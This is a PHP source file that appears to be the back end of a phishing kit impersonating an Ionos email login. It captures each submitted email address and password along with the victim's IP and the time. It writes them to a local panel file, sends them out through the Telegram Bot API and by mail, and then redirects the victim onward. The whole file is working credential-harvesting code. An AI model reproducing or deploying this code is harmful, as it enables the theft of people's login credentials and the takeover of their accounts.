<?php
error_reporting(0);
session_start();
require_once '../config.php'; 
date_default_timezone_set('Africa/Cairo');
$Date_Info  = date("d-m-Y h:i A");
function getUserIPs()
{
    $client = @$_SERVER['HTTP_CLIENT_IP']; $forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
    elseif (filter_var($forward, FILTER_VALIDATE_IP)) {  $ip = $forward; }
    else  { $ip = $remote; }  return $ip; 
}
$ip = getUserIPs();

function telegram_send($message) {
    $curl = curl_init();
    $format   = 'HTML';
    require '../config.php';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $Telegram_Bot_Token .'/sendMessage?chat_id='. $Chat_Id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

$username = $_SESSION['username'] = $_POST['username'];
$password = $_SESSION['password'] = $_POST['password'];

$message = '
💸 [Login] 💸
Email Address      : '.$username.' 
Email Password       : '.$password.' 
💻 [Information] 💻
IP Address     : '.$ip.'  
Time           : '.$Date_Info.' 
💸 [Login] 💸
';

$f = fopen("../panel.php", "a");fwrite($f, $message);
$subject = "Ionos Login";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "From: Unknown <support@oreoo.com>" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
telegram_send(urlencode($message));
mail($yourmail, $subject, $message, $headers);
header("Location: ../app/auth.php");
